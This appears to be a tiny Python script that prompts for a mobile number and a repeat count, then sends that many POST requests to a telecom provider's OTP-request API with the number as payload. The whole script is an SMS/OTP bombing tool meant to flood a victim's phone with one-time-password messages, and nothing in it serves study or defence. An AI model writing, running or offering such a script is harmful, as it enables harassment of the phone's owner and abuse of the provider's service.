import requests
poom=input("pok")
pom=int(input("pom"))
for t in range(pom): requests.post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": poom,})
